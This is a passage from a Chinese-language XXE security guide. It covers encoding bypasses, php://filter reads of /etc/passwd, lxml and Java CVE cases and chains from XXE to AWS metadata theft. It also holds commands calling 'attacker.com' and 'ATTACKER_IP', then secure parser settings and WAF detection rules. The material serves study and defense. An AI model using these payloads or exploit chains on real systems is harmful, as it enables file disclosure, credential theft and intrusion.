**编码工具**：CyberChef — Encode Text (UTF-7, 65000)

## 10.3 HTML Entity 嵌套绕过

将参数实体声明用 HTML 数字实体编码，在被解析时先解码为正常的 DTD 语法：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % a "<&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data><env>&exfil;</env></data>
```

HTML 实体解码后还原为：`<!ENTITY % dtd SYSTEM "http://ourserver.com/bypass.dtd">`

**关键**：必须使用**数字**实体编码（`&#x21;` 而非 `&excl;`）。

## 10.4 php:// 协议替换 file://

当 `file://` 被 WAF 拦截时，PHP 环境可用 `php://filter`：

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
```

Java 环境可用 `jar:` 或 `netdoc:` 协议。

## 10.5 WrapWrap + Lightyear（PHP 高级绕过）

针对 `libxml2` 的 `LIBXML_NOENT` 禁用场景的绕过链，详见 [Impossible XXE in PHP](https://swarm.ptsecurity.com/impossible-xxe-in-php/) 研究报告。

---

# 0x0B 平台特定利用与 CVE 案例

## 11.1 Python lxml — 参数实体绕过 (CVE 相关)

Python 的 `lxml` 库底层使用 `libxml2`。**lxml < 5.4.0 / libxml2 < 2.13.8** 中，即使设置 `resolve_entities=False`，参数实体仍会被展开。

### 11.1.1 lxml < 5.4.0 利用

**前提**：
1. 找到或创建一个包含**未定义**参数实体的本地 DTD 文件（如 `/tmp/xml/config.dtd` 包含 `%config_hex;`）
2. 应用启用了 `load_dtd=True` 和/或 `resolve_entities=True`

```xml
<!DOCTYPE colors [
  <!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">
  <!ENTITY % config_hex '
    <!ENTITY % flag SYSTEM "file:///tmp/flag.txt">
    <!ENTITY % eval "<!ENTITY % error SYSTEM ''file:///aaa/%flag;''>">
  %eval;'>
  %local_dtd;
]>
```

错误输出：
```
Error : failed to load external entity "file:///aaa/FLAG{secret}"
```

**特殊字符处理**：如果解析器抱怨 `%`/`&` 字符，使用双重编码（`&#x26;#x25;` → `%`）延迟展开。

### 11.1.2 lxml ≥ 5.4.0 绕过

`lxml` 5.4.0 禁止了错误参数实体，但 **libxml2 仍然允许将错误实体嵌入到通用实体中**：

```xml
<!DOCTYPE colors [
  <!ENTITY % a '
    <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
    <!ENTITY % b "<!ENTITY c SYSTEM ''meow://%file;''>">
  '>
  %a; %b;
]>
<colors>&c;</colors>
```

使用不存在的协议 `meow://` 触发解析错误，错误 URI 中包含文件内容。

### 11.1.3 缓解措施

- 升级 lxml ≥ 5.4.0 且 libxml2 ≥ 2.13.8
- 禁用 `load_dtd` 和/或 `resolve_entities`（除非绝对必要）
- 避免将解析器原始错误返回给客户端

## 11.2 Java DocumentBuilderFactory — CVE-2025-27136

Java 应用中 XML 解析的默认配置**启用了外部实体解析**。`DocumentBuilderFactory.newInstance()` 创建的解析器默认不安全：

```java
// ❌ 不安全 — 默认启用外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = dbf.newDocumentBuilder();
```

**安全配置**：

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// 完全禁止 DOCTYPE 声明（最彻底）
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// 禁用外部通用实体
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);

// 禁用外部参数实体
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

// 启用安全处理
dbf.setFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING, true);

// 防御性附加配置
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder builder = dbf.newDocumentBuilder();
```

**真实案例 — CVE-2025-27136**：Java S3 模拟器 *LocalS3* 使用了上述不安全配置。未认证攻击者可通过 `CreateBucketConfiguration` 端点提交恶意 XML，使服务器将本地文件嵌入 HTTP 响应。

**如果必须支持 DTD**：保留 `disallow-doctype-decl` 禁用状态，但**必须**将 `external-general-entities` 和 `external-parameter-entities` 设为 `false`。

## 11.3 Java 全局系统属性加固

```bash
-Djavax.xml.parsers.DocumentBuilderFactory=com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl
-Djdk.xml.entityExpansionLimit=0
```

## 11.4 PHP — defusedxml 安全解析

```python
# Python defusedxml — 自动禁用外部实体
from defusedxml.ElementTree import parse, fromstring
tree = fromstring(xml_data)
```

---

# 0x0C 利用链建模

## 12.1 XXE → SSRF → IMDS → AWS 凭证窃取

```
[用户提交 XML] → [XML 解析器解析外部实体]
    → [SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"]
    → [发起 HTTP GET 到 EC2 元数据服务]
    → [获取 AccessKeyId / SecretAccessKey / Token]
    → [使用 AWS CLI 植入后门 / 横向移动 / 数据窃取]
```

**关键条件**：目标在 AWS EC2 上运行，IMDSv1 启用（IMDSv2 需 PUT 请求 + Token，XXE 无法满足）。

## 12.2 XXE → 文件读取 → 源码审计 → 凭据泄露 → 数据库接管

```
[XXE 读取 /var/www/html/config.php]
    → [发现数据库密码和 SMTP 凭据]
    → [XXE 读取 /var/www/html/.env]
    → [发现 AWS S3 Bucket 名称和 API Key]
    → [使用凭据登录外部服务]
```

**工具链**：先用 XXE 读取应用配置文件，提取硬编码凭据后转向外部服务攻击。

## 12.3 SVG XXE → SSRF → 内网横向移动

```
[上传恶意 SVG 到头像服务]
    → [服务端 ImageMagick 解析 SVG → 触发 XXE]
    → [SSRF 扫描内网 10.0.0.0/24]
    → [发现内网管理面板 http://10.0.0.5:8080/admin]
    → [SSRF 请求管理 API 创建后门账户]
```

## 12.4 XXE → jar: 协议 → 临时文件驻留 → 路径遍历 → RCE

```
[XXE 触发 jar:http://attacker.com/evil.zip!/evil.dtd]
    → [slow_http_server 无限期保持连接]
    → [evil.zip 临时驻留在 /tmp/xxx]
    → [路径遍历漏洞读取 /tmp/xxx/evil.dtd]
    → [XSLT 处理器加载外部 XSL → RCE]
```

## 12.5 Office XXE → 盲外带 → 内网凭据窃取

```
[上传恶意 XLSX 到报表导入功能]
    → [服务端解析 xl/workbook.xml 触发 XXE]
    → [外部 DTD 读取 /home/app/.aws/credentials]
    → [通过 HTTP/FTP 外带到攻击者服务器]
    → [AWS 凭据 → 云环境后渗透]
```

---

# 0x0D 检测与防御

## 13.1 XXE 检测清单

### 13.1.1 手动测试

- [ ] 提交含内部实体的 XML，验证实体是否被展开
- [ ] 提交 `SYSTEM "file:///etc/passwd"` 测试文件读取
- [ ] 提交 `SYSTEM "http://your-collaborator"` 测试 SSRF
- [ ] 提交 `SYSTEM "http://169.254.169.254/"` 探测云环境
- [ ] 切换 `Content-Type: application/json` → `application/xml`
- [ ] 上传含 XXE Payload 的 SVG/DOCX/XLSX 文件
- [ ] 发送 XInclude Payload（当 DOCTYPE 不可控时）
- [ ] 测试 Billion Laughs（5-6 层足够检测，无需 10 层）

### 13.1.2 自动化检测工具

```bash
# xxexploiter — Node.js XXE 自动扫描
npx xxexploiter --target https://target.com/api/endpoint

# XXEInjector — Ruby 盲 XXE 自动化外带
ruby XXEinjector.rb --host=ATTACKER_IP --path=/etc/passwd --ssl

# Collaborator 手动检测
curl -X POST https://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxx.burpcollaborator.net">]><foo>&xxe;</foo>'
```

## 13.2 各语言安全配置速查

### Python

```python
# defusedxml — 一行安全
from defusedxml.ElementTree import fromstring
tree = fromstring(xml_data)

# lxml 安全配置
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)
tree = etree.fromstring(xml_data, parser)
```

### Java

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

### PHP

```php
// 禁用外部实体加载
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);  // LIBXML_NOENT 替代实体而非展开

// PHP 8.0+: libxml_disable_entity_loader 已废弃，使用 LIBXML_NOXXE
$dom->loadXML($xml, LIBXML_NOXXE);
```

### .NET

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // 或 DtdProcessing.Ignore
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(new StringReader(xml), settings);
```

### Node.js

```javascript
const libxml = require('libxmljs');
const doc = libxml.parseXml(xml, {
    dtdload: false,    // 禁止加载外部 DTD
    dtdvalid: false,   // 禁止 DTD 验证
    nonet: true,       // 禁止网络访问
    noent: false       // 禁止实体替换
});
```

## 13.3 分层防御架构

| 层级 | 措施 | 效果 |
|------|------|------|
| **输入层** | WAF 检测 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM` 关键字 | 拦截明显攻击 |
| **解析层** | 禁用外部实体/DTD/XInclude | 核心防御——即使绕过 WAF 也无法利用 |
| **网络层** | 解析器运行环境禁止出站连接（防火墙/容器网络隔离） | 阻断盲 XXE 外带和 SSRF |
| **应用层** | 不返回解析器错误消息 | 阻断错误外带路径 |
| **架构层** | 解析操作沙箱化（最低权限、只读文件系统、无网络） | 纵深——单层失败不影响整体安全 |
| **监控层** | 审计日志记录所有 XML 解析错误和异常实体 | 检测探测行为 |

## 13.4 WAF 检测规则参考

**XML 层检测特征**：
- 请求体包含 `<!DOCTYPE` + `<!ENTITY` + `SYSTEM` 关键字组合
- XML 中包含 `file://`、`gopher://`、`netdoc://`、`jar://`、`expect://`、`php://` 等危险 URI 方案
- XML 中参数实体引用次数异常（> 1000 次展开）
- `xml-stylesheet` 处理指令引用外部 URL
- 请求包含 `XInclude` 命名空间 + `href` 属性指向本地文件

**文件上传层**：
- SVG 文件中包含 `<!ENTITY` 或 `SYSTEM` 关键字
- Office Open XML 的 `document.xml` 中包含 DOCTYPE 声明
- XLIFF 文件中包含参数实体声明

---

## 参考资料

- [PortSwigger — XXE Labs (带互动实验室)](https://portswigger.net/web-security/xxe)
- [PortSwigger — Blind XXE Labs](https://portswigger.net/web-security/xxe/blind)
- [OWASP — XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [GoSecure — dtd-finder (系统 DTD 路径扫描)](https://github.com/GoSecure/dtd-finder)
- [GoSecure — XXE Workshop (含 jar: 协议利用)](https://gosecure.github.io/xxe-workshop/#7)
- [ONSec Lab — XXE FTP Server (多行文件外带)](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)
- [Detectify Labs — Obscure XXE Attacks (Office Open XML 等)](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/)
- [PT SWARM — Impossible XXE in PHP (WrapWrap + Lightyear)](https://swarm.ptsecurity.com/impossible-xxe-in-php/)
- [Swissky — PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)
- [lxml Bug #2107279 — Parameter-Entity XXE](https://bugs.launchpad.net/lxml/+bug/2107279)
- [OffSec Blog — CVE-2025-27136 LocalS3 XXE](https://www.offsec.com/blog/cve-2025-27136/)
- [Horizon3.ai — FreeFlow Core XXE/SSRF + Path Traversal](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Black Hat EU 2013 — XML Out-of-Band Data Retrieval (Osipov)](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
- [XXE Cheat Sheet (web-in-security.blogspot.com)](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
- [pwn.vg — Local File Read via Error-Based XXE (XLIFF)](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)
- [Ambrotd — XXE-Notes (HTML Entity 绕过等)](https://github.com/Ambrotd/XXE-Notes)
- [xxexploiter — Node.js XXE Scanner](https://github.com/luisfontes19/xxexploiter)
